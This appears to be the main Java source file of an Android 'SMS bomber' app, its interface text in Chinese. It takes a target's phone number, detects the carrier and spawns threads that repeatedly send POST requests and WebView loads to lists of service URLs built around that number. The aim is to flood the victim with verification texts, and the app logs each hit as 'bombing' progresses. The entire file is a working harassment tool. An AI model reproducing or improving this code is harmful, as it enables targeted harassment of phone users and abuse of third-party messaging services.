package com.vbes.sms;

import java.util.List;
import java.util.Date;
import java.util.ArrayList;
import java.net.URL;
import java.net.HttpURLConnection;
import java.text.SimpleDateFormat;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.widget.EditText;
import android.widget.Button;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.webkit.WebView;

public class MainActivity extends Activity 
{
	EditText edtPhone;
	TextView txtPreview;
	Spinner spThread;
	ScrollView scrollView;
	Button btnStart;
	boolean START = false;
	//WebView webView;
	String[] urls_list, urls_yd, urls_lt, phone_yd, phone_lt, phone_dx;
	List<WebView> webList;
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		
		edtPhone = (EditText) findViewById(R.id.edtPhone);
		txtPreview = (TextView) findViewById(R.id.txtPreview);
		spThread = (Spinner) findViewById(R.id.spiThread);
		scrollView = (ScrollView) findViewById(R.id.scrollView);
		//webView = (WebView) findViewById(R.id.webView);
		btnStart = (Button) findViewById(R.id.btnStart);
		urls_list = getResources().getStringArray(R.array.array_urls);
		urls_yd = getResources().getStringArray(R.array.array_yd);
		urls_lt = getResources().getStringArray(R.array.array_lt);
		phone_yd = getResources().getString(R.string.number_mobile).split(",");
		phone_lt = getResources().getString(R.string.number_unicom).split(",");
		phone_dx = getResources().getString(R.string.number_telcom).split(",");
		webList = new ArrayList<WebView>();
		btnStart.setOnClickListener(new View.OnClickListener()
		{
			public void onClick(View v)
			{
				if (START)
					toStop();
				else
				{
					String phone = edtPhone.getText().toString();
					if (phone.length() != 11)
					{
						edtPhone.setError("请输入正确的手机号");
						return;
					}
					int type = getPhoneType(phone);
					if (type == 0)
					{
						edtPhone.setError("您输入的手机号不合法");
						return;
					}
					StringBuilder sb = new StringBuilder();
					sb.append("输入手机号的运营商是："+(type==1?"移动":type==2?"联通":"电信"));
					sb.append("\n选择线程为：" + spThread.getSelectedItem());
					int thread = Integer.parseInt(spThread.getSelectedItem().toString());
					txtPreview.setText(sb.toString());
					switch (type)
					{
						case 1://移动
							toStart(thread, urls_yd, phone);
							break;
						case 2://联通
							toStart(thread, urls_lt, phone);
							break;
						case 3://电信
							toStart(thread, null, phone);
							break;
					}
				}
			}
		});
    }
	
	public int getPhoneType(String phone)
	{
		String s = phone.substring(0, 3);
		if (getPhoneType(s, phone_yd))
			return 1;
		if (getPhoneType(s, phone_lt))
			return 2;
		if (getPhoneType(s, phone_dx))
			return 3;
		return 0;
	}
	
	public void toStart(int thread, String[] plugin, String phone)
	{
		START = true;
		mHandler.sendEmptyMessage(0);
		for (int i = 0; i < thread; i++)
		{
			new MyThread(urls_list, plugin, phone).start();
		}
	}
	
	public void toStop()
	{
		START = false;
		mHandler.sendEmptyMessage(5);
		if (webList != null && webList.size() > 0)
		{
			for (WebView web : webList)
			{
				try
				{
					if (web != null)
						web.destroy();
					web = null;
				}
				catch (Exception e)
				{
					Message emsg = new Message();
					emsg.what = 1;
					emsg.obj = "结束出错:" + e.toString();
					mHandler.sendMessage(emsg);
				}
			}
			webList.clear();
		}
	}
	
	public boolean getPhoneType(String pre, String[] list)
	{
		for (int i = 0; i < list.length; i++)
		{
			if (pre.equals(list[i]))
				return true;
		}
		return false;
	}
	
	Handler mHandler = new Handler()
	{
		@Override
		public void handleMessage(Message msg)
		{
			switch (msg.what)
			{
				case 0:
					btnStart.setText("停止轰炸");
					START = true;
					break;
				case 1:
					txtPreview.setText(txtPreview.getText().toString() + "\n" + msg.obj);
					scrollView.smoothScrollTo(0, txtPreview.getHeight());
					break;
				case 2:
					neFunc(msg.obj.toString());
					break;
				case 5:
					btnStart.setText("开始轰炸");
					START = false;
					break;
			}
			super.handleMessage(msg);
		}
		
	};
	
	class MyThread extends Thread implements Runnable
	{
		String[] urlList, spList;
		int count;
		String number;
		SimpleDateFormat dated;
		public MyThread(String[] urllist, String[] splist, String phone)
		{
			urlList = urllist;
			spList = splist;
			number = phone;
			dated = new SimpleDateFormat("HH:mm:ss");
			count = urlList.length;
			if (spList != null)
				count += spList.length;
		}
		
		@Override
		public void run()
		{
			try
			{
				if (!START)
					return;
				Message lmsg = new Message();
				lmsg.what = 1;
				lmsg.obj = dated.format(new Date()) + "：\t正在轰炸，已匹配" + count + "条线路。";
				mHandler.sendMessage(lmsg);
				for (int j = 0; j < urlList.length; j++)
				{
					if (!START)
						break;
					Message msg = new Message();
					msg.what = 2;
					String url = getUrl(urlList[j], number);
					msg.obj = url;
					mHandler.sendMessage(msg);
					new UrlThread(url, 2000).start();
					sleep(100);
				}
				if (spList != null)
				{
					for (int j = 0; j < spList.length; j++)
					{
						if (!START)
							break;
						Message msg = new Message();
						msg.what = 2;
						String url = getUrl(spList[j], number);
						msg.obj = url;
						mHandler.sendMessage(msg);
						new UrlThread(url, 2000).start();
						sleep(100);
					}
				}
				sleep(1000);
				Message mmsg = new Message();
				mmsg.what = 1;
				mmsg.obj = "轰炸进行中……";
				mHandler.sendMessage(mmsg);
			}
			catch (Exception e)
			{
				Message emsg = new Message();
				emsg.what = 1;
				emsg.obj = "运行错误:" + e.toString();
				mHandler.sendMessage(emsg);
			}
		}
		
		public String getUrl(String old, String phone)
		{
			return String.format(old, phone, new Date().getTime());
		}
	}
	
	public void neFunc(String u)
	{
		try
		{
			WebView webView = new WebView(this);
			webView.loadUrl(u);
			webList.add(webView);
			//web.destroy();
			/*HttpClientBuilder builder = HttpClientBuilder.create();
			 CloseableHttpClient client = builder.build();
			 HttpGet http = new HttpGet(u);
			 CloseableHttpResponse respose = client.execute(http);
			 try
			 {
			 HttpEntity entity = respose.getEntity();
			 if (entity != null)
			 {
			 Message msg = new Message();
			 msg.what = 1;
			 msg.obj = u + "\n" + entity.toString();
			 mHandler.sendMessage(msg);
			 EntityUtils.consume(entity);
			 }
			 }
			 catch (Exception e)
			 {
			 Message emsg = new Message();
			 emsg.what = 1;
			 emsg.obj = "出错:" + e.toString();
			 mHandler.sendMessage(emsg);
			 }
			 finally
			 {
			 http.releaseConnection();
			 respose.close();
			 }*/
		}
		catch (Exception e)
		{
			Message emsg = new Message();
			emsg.what = 1;
			emsg.obj = "一般出错:" + e.toString();
			mHandler.sendMessage(emsg);
		}
		catch (Error e)
		{
			Message emsg = new Message();
			emsg.what = 1;
			emsg.obj = "严重出错:" + e.toString();
			mHandler.sendMessage(emsg);
		}
		finally
		{
			
		}
	}
	
	class UrlThread extends Thread implements Runnable
	{
		String u;
		long timeout;
		public UrlThread(String _u, long time)
		{
			u = _u;
			timeout = time;
		}
		
		public void run()
		{
			old();
		}
		public void old()
		{
			try
			{
				URL url = new URL(u);
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setConnectTimeout(5000);
				conn.setRequestMethod("POST");
				conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
				conn.setRequestProperty("Connection", "Keep-Alive");
				conn.setUseCaches(false);
				conn.setDoOutput(true);
				/*conn.connect();
				sleep(timeout);
				conn.disconnect();*/
				Message emsg = new Message();
				emsg.what = 1;
				if (conn.getResponseCode() == HttpURLConnection.HTTP_OK)
					emsg.obj = "成功:"+u;// + "\n信息:"+ conn.getResponseMessage();
				else
					emsg.obj = "失败(" + conn.getResponseCode() + "):"+u+"\n错误信息:"+conn.getResponseMessage();
				mHandler.sendMessage(emsg);
				conn.disconnect();
			}
			catch (Exception e)
			{
				Message emsg = new Message();
				emsg.what = 1;
				emsg.obj = "连接错误:" + e.toString();
				mHandler.sendMessage(emsg);
			}
		}
		
		
	}
}
